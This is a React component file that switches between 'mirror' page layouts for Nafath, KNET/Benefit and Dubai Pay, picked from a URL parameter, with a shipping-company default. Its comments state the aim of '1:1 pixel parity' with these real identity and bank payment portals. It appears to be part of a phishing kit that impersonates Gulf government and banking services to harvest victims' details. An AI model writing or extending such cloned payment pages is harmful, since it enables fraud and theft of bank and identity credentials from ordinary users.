import React from 'react';
import { useSearchParams } from "react-router-dom";
import { PaymentEntityConfig, resolveEntity } from "@/config/gccPaymentEntities";
import { 
  NafathMirrorLayout, 
  KnetMirrorLayout, 
  DubaiPayMirrorLayout 
} from "./MirrorLayouts";
import { ThemedHeader } from "@/components/ui/ThemedHeader";

interface MirrorPageWrapperProps {
  children: React.ReactNode;
  entityId?: string;
  title?: string;
  subtitle?: string;
  linkData?: any;
}

/**
 * MirrorPageWrapper
 * 
 * Dynamic Layout Selector that replaces the entire page shell 
 * based on the 'entityId' to achieve 1:1 pixel parity.
 */
export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({ 
  children, 
  entityId, 
  title, 
  subtitle,
  linkData 
}) => {
  const [searchParams] = useSearchParams();
  const companyKey = entityId || searchParams.get("company") || linkData?.payload?.service_key || 'aramex';
  const entityConfig = resolveEntity(companyKey);

  // 1. NAFATH (KSA Identity) - 1:1 Parity
  if (companyKey.includes('nafath')) {
    return (
      <NafathMirrorLayout config={entityConfig} title={title}>
        {children}
      </NafathMirrorLayout>
    );
  }

  // 2. KNET (Kuwait Bank Services) - 1:1 Parity
  if (companyKey.includes('knet') || companyKey.includes('benefit')) {
    return (
      <KnetMirrorLayout config={entityConfig}>
        {children}
      </KnetMirrorLayout>
    );
  }

  // 3. DUBAI PAY (UAE Portal) - 1:1 Parity
  if (companyKey.includes('dubai') || companyKey.includes('dubaipay')) {
    return (
      <DubaiPayMirrorLayout config={entityConfig} title={title}>
        {children}
      </DubaiPayMirrorLayout>
    );
  }

  // DEFAULT (Generic Themed Layout) - For Shipping & Other Providers
  return (
    <div className="min-h-screen flex flex-col bg-background font-primary" dir="rtl">
      <ThemedHeader
        config={entityConfig}
        title={entityConfig.nameAr}
        subtitle="E-Services & Payment Gateway"
      />
      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
        <div className="w-full max-w-xl space-y-8">
          <div className="text-center space-y-2">
            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-foreground">{title || 'بيانات مستلم الخدمة'}</h2>
            <p className="text-sm font-medium uppercase tracking-wide text-muted-foreground">{subtitle || 'Recipient Information & Verification'}</p>
          </div>
          {children}
        </div>
      </main>
    </div>
  );
};
